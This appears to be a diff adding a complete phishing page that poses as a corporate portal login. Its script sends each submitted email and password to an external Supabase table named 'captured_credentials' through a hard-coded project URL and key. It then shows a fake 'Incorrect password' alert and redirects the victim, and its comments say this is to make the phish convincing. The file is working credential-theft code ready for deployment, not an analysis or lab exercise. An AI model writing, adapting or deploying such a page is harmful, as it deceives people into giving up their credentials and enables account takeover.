@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Corporate Portal</title>
+    <!-- 1. Include the Supabase JS Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .login-container { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; width: 360px; }
+        .login-container img { width: 100px; margin-bottom: 20px; }
+        .login-container h1 { font-size: 24px; margin-bottom: 20px; color: #333; }
+        .login-container input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; }
+        .login-container button { width: 100%; padding: 12px; border: none; border-radius: 6px; background-color: #007bff; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .login-container button:hover { background-color: #0056b3; }
+        #message { margin-top: 15px; color: green; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Optional: Add a real logo here -->
+        <!-- <img src="URL_TO_A_REAL_LOGO.png" alt="Company Logo"> -->
+        <h1>Sign in to your account</h1>
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Email address" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        // 2. Initialize the Supabase Client
+        const SUPABASE_URL = 'https://regdgoxwhrubvarqydhc.supabase.co'; // Paste your Project URL here
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJlZ2Rnb3h3aHJ1YnZhcnF5ZGhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQ4NjIyMjQsImV4cCI6MjA3MDQzODIyNH0.P-6QUeeTRhFwx655FoSeS9Oacwmgqy8YW6-W3Z9FEnw'; // Paste your anon public key here
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // 3. Handle the form submission
+        const loginForm = document.getElementById('login-form');
+        const messageDiv = document.getElementById('message');
+
+        loginForm.addEventListener('submit', async (event) => {
+            // Prevents the default form submission behavior
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            messageDiv.textContent = 'Signing in...';
+
+            // 4. Insert the captured data into your Supabase table
+            const { data, error } = await supabase
+                .from('captured_credentials')
+                .insert([
+                    { username: email, password: password },
+                ]);
+
+            if (error) {
+                console.error('Error capturing credentials:', error);
+                messageDiv.textContent = 'An error occurred. Please try again.';
+                messageDiv.style.color = 'red';
+            } else {
+                console.log('Credentials captured:', data);
+                messageDiv.textContent = 'Login successful!';
+                
+                // Make it more convincing: show a fake error and redirect
+                alert("Incorrect password. Please try again.");
+                
+                // Redirect to the REAL login page after 1 second to make the phish seem like a mistake
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com'; // Change this to the REAL website URL
+                }, 1000);
+            }
+        });
+    </script>
+
+</body>
+</html>
